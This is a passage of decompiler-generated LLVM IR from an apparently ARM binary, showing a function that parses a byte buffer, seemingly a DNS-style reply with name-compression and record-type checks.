  %v0_edf4 = load i32, i32* @r4, align 4
  store i32 %v0_edf4, i32* %r3.global-to-local, align 4
  %v2_edf8154 = load i32, i32* @r6, align 4
  %v3_edf8155 = add i32 %v2_edf8154, %v0_edf4
  %v4_edf8156 = inttoptr i32 %v3_edf8155 to i32*
  store i32 %v0_edf4, i32* %v4_edf8156, align 4
  %v0_edfc157 = load i32, i32* %r3.global-to-local, align 4
  %v1_edfc158 = add i32 %v0_edfc157, 4
  store i32 %v1_edfc158, i32* %r3.global-to-local, align 4
  %v7_ee00159 = icmp eq i32 %v1_edfc158, 128
  br i1 %v7_ee00159, label %dec_label_pc_ee08, label %dec_label_pc_edf8.dec_label_pc_edf8_crit_edge

dec_label_pc_edf8.dec_label_pc_edf8_crit_edge:    ; preds = %dec_label_pc_edd0, %dec_label_pc_edf8.dec_label_pc_edf8_crit_edge
  %v1_edfc160 = phi i32 [ %v1_edfc, %dec_label_pc_edf8.dec_label_pc_edf8_crit_edge ], [ %v1_edfc158, %dec_label_pc_edd0 ]
  %v0_edf8.pre = load i32, i32* @r4, align 4
  %v2_edf8 = load i32, i32* @r6, align 4
  %v3_edf8 = add i32 %v2_edf8, %v1_edfc160
  %v4_edf8 = inttoptr i32 %v3_edf8 to i32*
  store i32 %v0_edf8.pre, i32* %v4_edf8, align 4
  %v0_edfc = load i32, i32* %r3.global-to-local, align 4
  %v1_edfc = add i32 %v0_edfc, 4
  store i32 %v1_edfc, i32* %r3.global-to-local, align 4
  %v7_ee00 = icmp eq i32 %v1_edfc, 128
  br i1 %v7_ee00, label %dec_label_pc_ee08, label %dec_label_pc_edf8.dec_label_pc_edf8_crit_edge

dec_label_pc_ee08:                                ; preds = %dec_label_pc_edf8.dec_label_pc_edf8_crit_edge, %dec_label_pc_edd0
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ee08 = load i32, i32* @r8, align 4
  %v3_ee08 = udiv i32 %v0_ee08, 32
  %v3_ee10 = mul nuw nsw i32 %v3_ee08, 4
  store i32 %v3_ee10, i32* %r3.global-to-local, align 4
  store i32 %v2_ee14, i32* %r2.global-to-local, align 4
  %v2_ee18 = add i32 %v3_ee10, %v2_ee14
  store i32 %v2_ee18, i32* @r5, align 4
  %v1_ee1c = add i32 %v2_ee18, -156
  %v2_ee1c = inttoptr i32 %v1_ee1c to i32*
  %v3_ee1c = load i32, i32* %v2_ee1c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_ee24 = urem i32 %v0_ee08, 32
  store i32 %v1_ee24, i32* @r7, align 4
  %v7_ee28 = shl i32 1, %v1_ee24
  %v8_ee28 = or i32 %v3_ee1c, %v7_ee28
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_ee28, i32* %v2_ee1c, align 4
  %v0_ee38 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_ee38, i32* %stack_var_-48, align 4
  store i32 %v2_ee40, i32* @lr, align 4
  store i32 %v2_ec98, i32* %ip.global-to-local, align 4
  %v0_ee48 = load i32, i32* @r8, align 4
  %v1_ee48 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee48 = add i32 %v1_ee48, %v0_ee48
  store i32 %v2_ee48, i32* %r0.global-to-local, align 4
  store i32 %v2_ed70, i32* %r1.global-to-local, align 4
  %v0_ee54 = load i32, i32* @r4, align 4
  store i32 %v0_ee54, i32* %r2.global-to-local, align 4
  store i32 %v0_ee54, i32* %r3.global-to-local, align 4
  %v5_ee60 = call i32 @function_11d10(i32 %v2_ee48, i32 %v2_ed70, i32 %v0_ee54, i32 %v0_ee54, i32 %v2_ee40)
  store i32 %v5_ee60, i32* %r0.global-to-local, align 4
  %v7_ee64 = icmp eq i32 %v5_ee60, -1
  store i1 %v7_ee64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee64, label %dec_label_pc_eeb8, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %dec_label_pc_ee08
  %v0_ee6c = load i32, i32* @r5, align 4
  %v1_ee6c = add i32 %v0_ee6c, -156
  %v2_ee6c = inttoptr i32 %v1_ee6c to i32*
  %v3_ee6c = load i32, i32* %v2_ee6c, align 4
  %v1_ee70 = load i32, i32* @r7, align 4
  %v6_ee70 = ashr i32 %v3_ee6c, %v1_ee70
  store i32 %v6_ee70, i32* %r3.global-to-local, align 4
  %v1_ee74 = urem i32 %v6_ee70, 2
  %v2_ee74 = icmp eq i32 %v1_ee74, 0
  store i1 %v2_ee74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee74, label %dec_label_pc_eed8, label %dec_label_pc_ee7c

dec_label_pc_ee7c:                                ; preds = %dec_label_pc_ee6c
  store i32 %v2_ed38, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ee88 = load i32, i32* @r8, align 4
  store i32 %v0_ee88, i32* %r0.global-to-local, align 4
  %v0_ee8c = load i32, i32* @r4, align 4
  %v7_ee94 = call i32 @function_1231c(i32 %v0_ee88, i32* %v6_ee94, i32 2048, i32 16384, i32 %v0_ee8c, i32 %v0_ee8c)
  store i32 %v7_ee94, i32* %r4.global-to-local, align 4
  %v0_ee9c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ee9c, i32* %r0.global-to-local, align 4
  %v1_eea0 = inttoptr i32 %v0_ee9c to i8*
  %v2_eea0 = call i32 @function_111ec(i8* %v1_eea0)
  %v1_eea4 = add i32 %v2_eea0, 17
  store i32 %v1_eea4, i32* %r0.global-to-local, align 4
  %v0_eea8 = load i32, i32* %r4.global-to-local, align 4
  %v3_eea8 = icmp ult i32 %v0_eea8, %v1_eea4
  %v9_eea8 = icmp eq i32 %v0_eea8, %v1_eea4
  store i1 %v9_eea8, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_eea8, label %dec_label_pc_eeb8, label %dec_label_pc_ef0c

dec_label_pc_eeb8:                                ; preds = %dec_label_pc_ee7c, %dec_label_pc_ef0c, %dec_label_pc_ef48, %dec_label_pc_ee08, %dec_label_pc_ef00
  %v0_eeb8 = load i32, i32* %sl.global-to-local, align 4
  %v7_eeb8 = icmp eq i32 %v0_eeb8, 5
  store i1 %v7_eeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eeb8, label %dec_label_pc_eed8, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eec8, %dec_label_pc_eeb8
  %v0_eec0 = phi i32 [ %v0_eed0, %dec_label_pc_eec8 ], [ %v0_eeb8, %dec_label_pc_eeb8 ]
  %v1_eec0 = add i32 %v0_eec0, 1
  store i32 %v1_eec0, i32* %sl.global-to-local, align 4
  %v0_ed74.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_ed74

dec_label_pc_eec8:                                ; preds = %dec_label_pc_edb4, %dec_label_pc_ed9c
  %v0_eec8 = phi i32 [ %v5_edc4, %dec_label_pc_edb4 ], [ %v4_eda8, %dec_label_pc_ed9c ]
  %v1_eec8 = add i32 %v0_eec8, 2
  store i32 %v1_eec8, i32* %r0.global-to-local, align 4
  %v1_eecc = call i32 @function_12efc(i32 %v1_eec8)
  store i32 %v1_eecc, i32* %r0.global-to-local, align 4
  %v0_eed0 = load i32, i32* %sl.global-to-local, align 4
  %v7_eed0 = icmp eq i32 %v0_eed0, 5
  store i1 %v7_eed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed0, label %dec_label_pc_eed8, label %dec_label_pc_eec0

dec_label_pc_eed8:                                ; preds = %dec_label_pc_eec8, %dec_label_pc_eeb8, %dec_label_pc_ee6c, %dec_label_pc_ef58, %dec_label_pc_ef64.backedge
  %v0_eed8 = load i32, i32* @r8, align 4
  store i32 %v0_eed8, i32* %r0.global-to-local, align 4
  %v1_eedc = call i32 @function_11af0(i32 %v0_eed8)
  store i32 %v1_eedc, i32* %r0.global-to-local, align 4
  store i32 %v2_ec18, i32* %r2.global-to-local, align 4
  %v2_eee4 = load i8, i8* %v3_ec18, align 1
  %v3_eee4 = zext i8 %v2_eee4 to i32
  store i32 %v3_eee4, i32* @r4, align 4
  %v2_eee8 = icmp eq i8 %v2_eee4, 0
  store i1 %v2_eee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eee8, label %dec_label_pc_f044, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eed8, %dec_label_pc_f044
  %stack_var_-4300.0 = phi i8* [ %v5_f058, %dec_label_pc_f044 ], [ %v3_ec18, %dec_label_pc_eed8 ]
  %v4_eef0 = ptrtoint i8* %stack_var_-4300.0 to i32
  store i32 %v4_eef0, i32* %r0.global-to-local, align 4
  %v2_eefc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_eefc, i32* @r4, align 4
  store i32 %v6_ec00, i32* @r5, align 4
  store i32 %v9_ec00, i32* @r6, align 4
  store i32 %v12_ec00, i32* @r7, align 4
  store i32 %v15_ec00, i32* @r8, align 4
  ret i32 %v4_eef0

dec_label_pc_ef00:                                ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_ef04 = call i32 @function_12efc(i32 1)
  store i32 %v1_ef04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eeb8

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_ee7c
  store i32 %v2_ed38, i32* %lr.global-to-local, align 4
  store i32 %v1_ef10, i32* %fp.global-to-local, align 4
  store i32 %v1_ef10, i32* %r0.global-to-local, align 4
  %v2_ef18 = call i32 @function_111ec(i8* %v1_ef18)
  store i32 %v2_ef18, i32* %r0.global-to-local, align 4
  store i32 %v2_ed38, i32* %ip.global-to-local, align 4
  store i32 %v2_ee14, i32* %r1.global-to-local, align 4
  %v4_ef28 = load i8, i8* %stack_var_-4288, align 1
  %v5_ef28 = sext i8 %v4_ef28 to i32
  store i32 %v5_ef28, i32* %r3.global-to-local, align 4
  %v3_ef2c = load i8, i8* %v2_ef2c, align 1
  %v4_ef2c = zext i8 %v3_ef2c to i32
  store i32 %v4_ef2c, i32* %r2.global-to-local, align 4
  store i32 %v4_ecec, i32* @lr, align 4
  %v4_ef34 = mul nuw nsw i32 %v4_ef2c, 256
  %v5_ef34 = or i32 %v4_ef34, %v5_ef28
  store i32 %v5_ef34, i32* %r3.global-to-local, align 4
  %v0_ef38 = load i32, i32* %fp.global-to-local, align 4
  %v9_ef3c = icmp eq i32 %v5_ef34, %v4_ecec
  store i1 %v9_ef3c, i1* %cpsr_z.global-to-local, align 1
  %v2_ef38 = add i32 %v2_ef18, 5
  %v1_ef40 = add i32 %v2_ef38, %v0_ef38
  store i32 %v1_ef40, i32* %r0.global-to-local, align 4
  br i1 %v9_ef3c, label %dec_label_pc_ef48, label %dec_label_pc_eeb8

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef0c
  %v3_ef48 = load i8, i8* %v2_ef48, align 1
  %v4_ef48 = zext i8 %v3_ef48 to i32
  store i32 %v4_ef48, i32* %r2.global-to-local, align 4
  %v3_ef4c = load i8, i8* %v2_ef4c, align 1
  %v4_ef4c = zext i8 %v3_ef4c to i32
  store i32 %v4_ef4c, i32* %r3.global-to-local, align 4
  %v4_ef50 = mul nuw nsw i32 %v4_ef4c, 256
  %v5_ef50 = or i32 %v4_ef50, %v4_ef48
  store i32 %v5_ef50, i32* %r2.global-to-local, align 4
  %v7_ef50 = icmp eq i32 %v5_ef50, 0
  store i1 %v7_ef50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef50, label %dec_label_pc_eeb8, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef48
  %v3_ef5c = mul nuw nsw i32 %v4_ef48, 256
  %v5_ef60 = or i32 %v4_ef4c, %v3_ef5c
  %v1_f018 = add i32 %v2_ed38, -49152
  %v1_ef64143 = add nsw i32 %v5_ef60, -1
  %v3_ef68144 = mul i32 %v1_ef64143, 65536
  store i32 %v3_ef68144, i32* %r3.global-to-local, align 4
  %v7_ef6c150 = icmp eq i32 %v3_ef68144, -65536
  store i1 %v7_ef6c150, i1* %cpsr_z.global-to-local, align 1
  %v3_ef70151 = urem i32 %v1_ef64143, 65536
  store i32 %v3_ef70151, i32* @r6, align 4
  br i1 %v7_ef6c150, label %dec_label_pc_eed8, label %dec_label_pc_ef78.lr.ph

dec_label_pc_ef78.lr.ph:                          ; preds = %dec_label_pc_ef58
  %v1_f0f4 = add i32 %v2_ec18, 4
  %v2_f0f4 = inttoptr i32 %v1_f0f4 to i32*
  br label %dec_label_pc_ef78

dec_label_pc_ef78:                                ; preds = %dec_label_pc_ef78.lr.ph, %dec_label_pc_ef64.backedge
  %v3_ef70153 = phi i32 [ %v3_ef70151, %dec_label_pc_ef78.lr.ph ], [ %v3_ef70, %dec_label_pc_ef64.backedge ]
  %v0_efcc152 = phi i32 [ %v1_ef40, %dec_label_pc_ef78.lr.ph ], [ %storemerge, %dec_label_pc_ef64.backedge ]
  store i32 %v0_efcc152, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  %v1_ef8417 = inttoptr i32 %v0_efcc152 to i8*
  %v2_ef8418 = load i8, i8* %v1_ef8417, align 1
  %v3_ef8419 = zext i8 %v2_ef8418 to i32
  store i32 %v3_ef8419, i32* %r2.global-to-local, align 4
  %v2_ef8820 = icmp eq i8 %v2_ef8418, 0
  store i1 %v2_ef8820, i1* %cpsr_z.global-to-local, align 1
  %v3_ef8c21 = mul nuw nsw i32 %v3_ef8419, 256
  store i32 %v3_ef8c21, i32* %r1.global-to-local, align 4
  br i1 %v2_ef8820, label %dec_label_pc_efc4, label %dec_label_pc_ef94.preheader

dec_label_pc_ef94.preheader:                      ; preds = %dec_label_pc_ef78, %dec_label_pc_ef84.backedge
  %v1_f068 = phi i32 [ %v1_f06849, %dec_label_pc_ef84.backedge ], [ 1, %dec_label_pc_ef78 ]
  %v0_f06047 = phi i32 [ %v0_f060, %dec_label_pc_ef84.backedge ], [ 0, %dec_label_pc_ef78 ]
  %v0_efa045 = phi i32 [ %v3_ef8c, %dec_label_pc_ef84.backedge ], [ %v3_ef8c21, %dec_label_pc_ef78 ]
  %v0_ef9c43 = phi i32 [ %v1_f064, %dec_label_pc_ef84.backedge ], [ %v0_efcc152, %dec_label_pc_ef78 ]
  %v0_ef9441 = phi i32 [ %v3_ef84, %dec_label_pc_ef84.backedge ], [ %v3_ef8419, %dec_label_pc_ef78 ]
  br label %dec_label_pc_ef94

dec_label_pc_ef94:                                ; preds = %dec_label_pc_ef94.preheader, %dec_label_pc_ef9c
  %v0_f060 = phi i32 [ %v0_f06047, %dec_label_pc_ef94.preheader ], [ 1, %dec_label_pc_ef9c ]
  %v0_efa0 = phi i32 [ %v0_efa045, %dec_label_pc_ef94.preheader ], [ %v3_efbc, %dec_label_pc_ef9c ]
  %v0_f064 = phi i32 [ %v0_ef9c43, %dec_label_pc_ef94.preheader ], [ %v2_efac, %dec_label_pc_ef9c ]
  %v0_ef94 = phi i32 [ %v0_ef9441, %dec_label_pc_ef94.preheader ], [ %v3_efb0, %dec_label_pc_ef9c ]
  %v7_ef94 = icmp eq i32 %v0_ef94, 191
  store i1 %v7_ef94, i1* %cpsr_z.global-to-local, align 1
  %tmp180 = icmp ult i32 %v0_ef94, 192
  br i1 %tmp180, label %dec_label_pc_f060, label %dec_label_pc_ef9c

dec_label_pc_ef9c:                                ; preds = %dec_label_pc_ef94
  %v1_ef9c = add i32 %v0_f064, 1
  %v2_ef9c = inttoptr i32 %v1_ef9c to i8*
  %v3_ef9c = load i8, i8* %v2_ef9c, align 1
  %v4_ef9c = zext i8 %v3_ef9c to i32
  store i32 %v2_ed38, i32* %r1.global-to-local, align 4
  %v2_efa0 = add i32 %v0_efa0, %v1_f018
  %v2_efac = add i32 %v2_efa0, %v4_ef9c
  store i32 %v2_efac, i32* %r3.global-to-local, align 4
  %v1_efb0 = inttoptr i32 %v2_efac to i8*
  %v2_efb0 = load i8, i8* %v1_efb0, align 1
  %v3_efb0 = zext i8 %v2_efb0 to i32
  store i32 %v3_efb0, i32* %r2.global-to-local, align 4
  %v2_efb4 = icmp eq i8 %v2_efb0, 0
  store i1 %v2_efb4, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_efbc = mul nuw nsw i32 %v3_efb0, 256
  store i32 %v3_efbc, i32* %r1.global-to-local, align 4
  br i1 %v2_efb4, label %dec_label_pc_efc4, label %dec_label_pc_ef94

dec_label_pc_efc4:                                ; preds = %dec_label_pc_ef84.backedge, %dec_label_pc_ef9c, %dec_label_pc_ef78
  %v1_efc8 = phi i32 [ 1, %dec_label_pc_ef78 ], [ %v1_f068, %dec_label_pc_ef9c ], [ %v1_f06849, %dec_label_pc_ef84.backedge ]
  %v0_efc4 = phi i32 [ 0, %dec_label_pc_ef78 ], [ 1, %dec_label_pc_ef9c ], [ %v0_f060, %dec_label_pc_ef84.backedge ]
  %v7_efc4 = icmp eq i32 %v0_efc4, 1
  store i1 %v7_efc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efc4, label %bb127, label %bb128

bb127:                                            ; preds = %dec_label_pc_efc4
  %v2_efc8 = add i32 %v1_efc8, 1
  store i32 %v2_efc8, i32* @lr, align 4
  br label %bb128

bb128:                                            ; preds = %dec_label_pc_efc4, %bb127
  %v1_efcc = phi i32 [ %v1_efc8, %dec_label_pc_efc4 ], [ %v2_efc8, %bb127 ]
  %v2_efcc = add i32 %v1_efcc, %v0_efcc152
  store i32 %v2_efcc, i32* @r4, align 4
  %v3_efd0 = inttoptr i32 %v2_efcc to i8*
  %v4_efd0 = load i8, i8* %v3_efd0, align 1
  %v6_efd0 = zext i8 %v4_efd0 to i32
  store i32 %v6_efd0, i32* %r3.global-to-local, align 4
  %v1_efd4 = add i32 %v2_efcc, 1
  %v2_efd4 = inttoptr i32 %v1_efd4 to i8*
  %v3_efd4 = load i8, i8* %v2_efd4, align 1
  %v4_efd4 = zext i8 %v3_efd4 to i32
  store i32 %v4_efd4, i32* %r2.global-to-local, align 4
  %v4_efd8 = mul nuw nsw i32 %v4_efd4, 256
  %v5_efd8 = or i32 %v4_efd8, %v6_efd0
  store i32 %v5_efd8, i32* %r3.global-to-local, align 4
  %v7_efdc = icmp eq i32 %v5_efd8, 256
  store i1 %v7_efdc, i1* %cpsr_z.global-to-local, align 1
  %v1_efe0 = add i32 %v2_efcc, 10
  store i32 %v1_efe0, i32* @r5, align 4
  br i1 %v7_efdc, label %dec_label_pc_f080, label %dec_label_pc_efe8

dec_label_pc_efe8:                                ; preds = %dec_label_pc_f080, %bb128
  store i32 %v1_efe0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_eff423 = inttoptr i32 %v1_efe0 to i8*
  %v2_eff424 = load i8, i8* %v1_eff423, align 1
  %v3_eff425 = zext i8 %v2_eff424 to i32
  store i32 %v3_eff425, i32* %r2.global-to-local, align 4
  %v2_eff826 = icmp eq i8 %v2_eff424, 0
  store i1 %v2_eff826, i1* %cpsr_z.global-to-local, align 1
  %v3_effc27 = mul nuw nsw i32 %v3_eff425, 256
  store i32 %v3_effc27, i32* %r1.global-to-local, align 4
  br i1 %v2_eff826, label %dec_label_pc_f034, label %dec_label_pc_f004.preheader

dec_label_pc_f004.preheader:                      ; preds = %dec_label_pc_efe8, %dec_label_pc_eff4.backedge
  %v1_f078 = phi i32 [ %v1_f07864, %dec_label_pc_eff4.backedge ], [ 1, %dec_label_pc_efe8 ]
  %v0_f07062 = phi i32 [ %v0_f070, %dec_label_pc_eff4.backedge ], [ 0, %dec_label_pc_efe8 ]
  %v0_f01060 = phi i32 [ %v3_effc, %dec_label_pc_eff4.backedge ], [ %v3_effc27, %dec_label_pc_efe8 ]
  %v0_f00c58 = phi i32 [ %v1_f074, %dec_label_pc_eff4.backedge ], [ %v1_efe0, %dec_label_pc_efe8 ]
  %v0_f00456 = phi i32 [ %v3_eff4, %dec_label_pc_eff4.backedge ], [ %v3_eff425, %dec_label_pc_efe8 ]
  br label %dec_label_pc_f004

dec_label_pc_f004:                                ; preds = %dec_label_pc_f004.preheader, %dec_label_pc_f00c
  %v0_f070 = phi i32 [ %v0_f07062, %dec_label_pc_f004.preheader ], [ 1, %dec_label_pc_f00c ]
  %v0_f010 = phi i32 [ %v0_f01060, %dec_label_pc_f004.preheader ], [ %v3_f02c, %dec_label_pc_f00c ]
  %v0_f074 = phi i32 [ %v0_f00c58, %dec_label_pc_f004.preheader ], [ %v2_f01c, %dec_label_pc_f00c ]
  %v0_f004 = phi i32 [ %v0_f00456, %dec_label_pc_f004.preheader ], [ %v3_f020, %dec_label_pc_f00c ]
  %v7_f004 = icmp eq i32 %v0_f004, 191
  store i1 %v7_f004, i1* %cpsr_z.global-to-local, align 1
  %tmp181 = icmp ult i32 %v0_f004, 192
  br i1 %tmp181, label %dec_label_pc_f070, label %dec_label_pc_f00c

dec_label_pc_f00c:                                ; preds = %dec_label_pc_f004
  %v1_f00c = add i32 %v0_f074, 1
  %v2_f00c = inttoptr i32 %v1_f00c to i8*
  %v3_f00c = load i8, i8* %v2_f00c, align 1
  %v4_f00c = zext i8 %v3_f00c to i32
  store i32 %v2_ed38, i32* %r1.global-to-local, align 4
  %v2_f010 = add i32 %v0_f010, %v1_f018
  %v2_f01c = add i32 %v2_f010, %v4_f00c
  store i32 %v2_f01c, i32* %r3.global-to-local, align 4
  %v1_f020 = inttoptr i32 %v2_f01c to i8*
  %v2_f020 = load i8, i8* %v1_f020, align 1
  %v3_f020 = zext i8 %v2_f020 to i32
  store i32 %v3_f020, i32* %r2.global-to-local, align 4
  %v2_f024 = icmp eq i8 %v2_f020, 0
  store i1 %v2_f024, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_f02c = mul nuw nsw i32 %v3_f020, 256
  store i32 %v3_f02c, i32* %r1.global-to-local, align 4
  br i1 %v2_f024, label %dec_label_pc_f034, label %dec_label_pc_f004

dec_label_pc_f034:                                ; preds = %dec_label_pc_eff4.backedge, %dec_label_pc_f00c, %dec_label_pc_efe8
  %v1_f038 = phi i32 [ 1, %dec_label_pc_efe8 ], [ %v1_f078, %dec_label_pc_f00c ], [ %v1_f07864, %dec_label_pc_eff4.backedge ]
  %v0_f034 = phi i32 [ 0, %dec_label_pc_efe8 ], [ 1, %dec_label_pc_f00c ], [ %v0_f070, %dec_label_pc_eff4.backedge ]
  %v7_f034 = icmp eq i32 %v0_f034, 1
  store i1 %v7_f034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f034, label %bb129, label %bb130

bb129:                                            ; preds = %dec_label_pc_f034
  %v2_f038 = add i32 %v1_f038, 1
  store i32 %v2_f038, i32* %r0.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_f034, %bb129
  %v1_f03c = phi i32 [ %v1_f038, %dec_label_pc_f034 ], [ %v2_f038, %bb129 ]
  %v2_f03c = add i32 %v1_f03c, %v1_efe0
  br label %dec_label_pc_ef64.backedge

dec_label_pc_ef64.backedge:                       ; preds = %bb130, %dec_label_pc_f128
  %v0_ef64.pre = phi i32 [ %v3_ef70153, %bb130 ], [ %v0_ef64.pre.pre, %dec_label_pc_f128 ]
  %storemerge = phi i32 [ %v2_f03c, %bb130 ], [ %v2_f13c, %dec_label_pc_f128 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_ef64 = add i32 %v0_ef64.pre, -1
  %v3_ef68 = mul i32 %v1_ef64, 65536
  store i32 %v3_ef68, i32* %r3.global-to-local, align 4
  %v7_ef6c = icmp eq i32 %v3_ef68, -65536
  store i1 %v7_ef6c, i1* %cpsr_z.global-to-local, align 1
  %v3_ef70 = urem i32 %v1_ef64, 65536
  store i32 %v3_ef70, i32* @r6, align 4
  br i1 %v7_ef6c, label %dec_label_pc_eed8, label %dec_label_pc_ef78

dec_label_pc_f044:                                ; preds = %dec_label_pc_eed8
  %v1_f044 = add i32 %v2_ec18, 4
  %v2_f044 = inttoptr i32 %v1_f044 to i32*
  %v3_f044 = load i32, i32* %v2_f044, align 4
  store i32 %v3_f044, i32* %r0.global-to-local, align 4
  %v2_f048 = icmp eq i32 %v3_f044, 0
  store i1 %v2_f048, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_f050.128 to i32), i32* @lr, align 4
  %v1_f04c = xor i1 %v2_f048, true
  call void @__pseudo_cond_branch(i1 %v1_f04c, i32 ptrtoint (i32* @global_var_12724.25 to i32))
  store i32 %v2_ec18, i32* @r0, align 4
  %v0_f054 = call i32 @function_12724()
  store i32 %v0_f054, i32* %r0.global-to-local, align 4
  %v0_f058 = load i32, i32* @r4, align 4
  %v5_f058 = inttoptr i32 %v0_f058 to i8*
  br label %dec_label_pc_eef0

dec_label_pc_f060:                                ; preds = %dec_label_pc_ef94
  %v2_f060 = icmp eq i32 %v0_f060, 0
  store i1 %v2_f060, i1* %cpsr_z.global-to-local, align 1
  %v1_f064 = add i32 %v0_f064, 1
  store i32 %v1_f064, i32* %r3.global-to-local, align 4
  br i1 %v2_f060, label %bb131, label %dec_label_pc_ef84.backedge

dec_label_pc_ef84.backedge:                       ; preds = %dec_label_pc_f060, %bb131
  %v1_f06849 = phi i32 [ %v1_f068, %dec_label_pc_f060 ], [ %v2_f068, %bb131 ]
  %v1_ef84 = inttoptr i32 %v1_f064 to i8*
  %v2_ef84 = load i8, i8* %v1_ef84, align 1
  %v3_ef84 = zext i8 %v2_ef84 to i32
  store i32 %v3_ef84, i32* %r2.global-to-local, align 4
  %v2_ef88 = icmp eq i8 %v2_ef84, 0
  store i1 %v2_ef88, i1* %cpsr_z.global-to-local, align 1
  %v3_ef8c = mul nuw nsw i32 %v3_ef84, 256
  store i32 %v3_ef8c, i32* %r1.global-to-local, align 4
  br i1 %v2_ef88, label %dec_label_pc_efc4, label %dec_label_pc_ef94.preheader

bb131:                                            ; preds = %dec_label_pc_f060
  %v2_f068 = add i32 %v1_f068, 1
  store i32 %v2_f068, i32* @lr, align 4
  br label %dec_label_pc_ef84.backedge

dec_label_pc_f070:                                ; preds = %dec_label_pc_f004
  %v2_f070 = icmp eq i32 %v0_f070, 0
  store i1 %v2_f070, i1* %cpsr_z.global-to-local, align 1
  %v1_f074 = add i32 %v0_f074, 1
  store i32 %v1_f074, i32* %r3.global-to-local, align 4
  br i1 %v2_f070, label %bb132, label %dec_label_pc_eff4.backedge

dec_label_pc_eff4.backedge:                       ; preds = %dec_label_pc_f070, %bb132
  %v1_f07864 = phi i32 [ %v1_f078, %dec_label_pc_f070 ], [ %v2_f078, %bb132 ]
  %v1_eff4 = inttoptr i32 %v1_f074 to i8*
  %v2_eff4 = load i8, i8* %v1_eff4, align 1
  %v3_eff4 = zext i8 %v2_eff4 to i32
  store i32 %v3_eff4, i32* %r2.global-to-local, align 4
  %v2_eff8 = icmp eq i8 %v2_eff4, 0
  store i1 %v2_eff8, i1* %cpsr_z.global-to-local, align 1
  %v3_effc = mul nuw nsw i32 %v3_eff4, 256
  store i32 %v3_effc, i32* %r1.global-to-local, align 4
  br i1 %v2_eff8, label %dec_label_pc_f034, label %dec_label_pc_f004.preheader

bb132:                                            ; preds = %dec_label_pc_f070
  %v2_f078 = add i32 %v1_f078, 1
  store i32 %v2_f078, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eff4.backedge

dec_label_pc_f080:                                ; preds = %bb128
  %v1_f080 = add i32 %v2_efcc, 2
  %v2_f080 = inttoptr i32 %v1_f080 to i8*
  %v3_f080 = load i8, i8* %v2_f080, align 1
  %v4_f080 = zext i8 %v3_f080 to i32
  store i32 %v4_f080, i32* %r3.global-to-local, align 4
  %v1_f084 = add i32 %v2_efcc, 3
  %v2_f084 = inttoptr i32 %v1_f084 to i8*
  %v3_f084 = load i8, i8* %v2_f084, align 1
  %v4_f084 = zext i8 %v3_f084 to i32
  store i32 %v4_f084, i32* %r2.global-to-local, align 4
  %v4_f088 = mul nuw nsw i32 %v4_f084, 256
  %v5_f088 = or i32 %v4_f088, %v4_f080
  store i32 %v5_f088, i32* %r3.global-to-local, align 4
  %v7_f08c = icmp eq i32 %v5_f088, 256
  store i1 %v7_f08c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f08c, label %dec_label_pc_f094, label %dec_label_pc_efe8

dec_label_pc_f094:                                ; preds = %dec_label_pc_f080
  %v1_f094 = add i32 %v2_efcc, 8
  %v2_f094 = inttoptr i32 %v1_f094 to i8*
  %v3_f094 = load i8, i8* %v2_f094, align 1
  %v4_f094 = zext i8 %v3_f094 to i32
  store i32 %v4_f094, i32* %r1.global-to-local, align 4
  %v1_f098 = add i32 %v2_efcc, 9
  %v2_f098 = inttoptr i32 %v1_f098 to i8*
  %v3_f098 = load i8, i8* %v2_f098, align 1
  %v4_f098 = zext i8 %v3_f098 to i32
  store i32 %v4_f098, i32* %r0.global-to-local, align 4
  %v4_f09c = mul nuw nsw i32 %v4_f098, 256
  %v5_f09c = or i32 %v4_f09c, %v4_f094
  %v3_f0a0 = mul i32 %v5_f09c, 65536
  store i32 %v3_f0a0, i32* %r2.global-to-local, align 4
  %v3_f0a4 = mul nuw nsw i32 %v4_f094, 256
  %v5_f0ac = or i32 %v4_f098, %v3_f0a4
  store i32 %v5_f0ac, i32* %r3.global-to-local, align 4
  %v7_f0b0 = icmp eq i32 %v5_f0ac, 4
  store i1 %v7_f0b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0b0, label %dec_label_pc_f0b8, label %dec_label_pc_f128

